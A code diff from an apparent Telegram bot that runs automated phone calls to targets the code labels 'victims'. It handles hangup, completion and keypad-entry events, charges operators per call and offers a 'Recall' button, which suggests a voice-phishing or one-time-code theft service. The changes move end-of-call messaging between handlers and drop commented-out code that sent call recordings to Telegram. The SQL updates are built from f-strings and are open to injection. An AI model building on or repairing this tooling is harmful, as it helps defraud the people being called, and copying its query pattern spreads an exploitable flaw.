@@ -956,36 +956,14 @@ def custom_prebuild_script_call(script_id,chatid):
         
 
     elif event == "call.hangup":
-        # call_cause = data['cause']
         try:
-            # resp = data['audio']
             per_call_cost = data['charge']
             call_cost_update = call_cost + per_call_cost
-            # response = requests.get(resp)
-            # payload = {
-            #     'chat_id': {chatid},
-            #     'title': 'transcript.mp3',
-            #     'parse_mode': 'HTML'
-            # }
-            # files = {
-            #     'audio': response.content,
-            # }
-            # requests.post(f"https://api.telegram.org/bot{bot_tkn}/sendAudio".format(bot_tkn=f"{bot_tkn}"),data=payload,files=files)
             c.execute(f"Update users set call_cost ={call_cost_update} where user_id={chatid}")
+            bot.send_message(chatid,f"""*Victim ended the call*""",reply_markup=keyboard, parse_mode='Markdown')
             db.commit()
         except:
             print("No Audio File")
-        finally:
-            global last_message_ids
-            mes = "Call Ended by Victim ☎️"
-            keyboard = types.InlineKeyboardMarkup(row_width=2)
-            item1 = types.InlineKeyboardButton(text="Recall", callback_data="/recall")
-            item0 = types.InlineKeyboardButton(text="Profile", callback_data="/profile")
-            keyboard.add(item1, item0)
-            mesid = bot.send_message(chatid,f"""*{mes}*""",reply_markup=keyboard, parse_mode='Markdown').message_id
-            last_message_ids[chatid]=mesid
-            c.execute(f"Update users set status='active' where user_id={chatid}")
-            db.commit()
 
 
     # elif event == "amd.machine":
@@ -995,7 +973,16 @@ def custom_prebuild_script_call(script_id,chatid):
     #     bot.send_message(chatid,f"""*Human Detected 👤*""",parse_mode='markdown')
 
     elif event == "call.complete":
-         bot.send_message(chatid,f"""*Call Competed*""",parse_mode='markdown')
+            global last_message_ids
+            mes = "Call Ended ☎️"
+            keyboard = types.InlineKeyboardMarkup(row_width=2)
+            item1 = types.InlineKeyboardButton(text="Recall", callback_data="/recall")
+            item0 = types.InlineKeyboardButton(text="Profile", callback_data="/profile")
+            keyboard.add(item1, item0)
+            mesid = bot.send_message(chatid,f"""*{mes}*""",reply_markup=keyboard, parse_mode='Markdown').message_id
+            last_message_ids[chatid]=mesid
+            c.execute(f"Update users set status='active' where user_id={chatid}")
+            db.commit()
 
 
     elif event == "dtmf.entered":
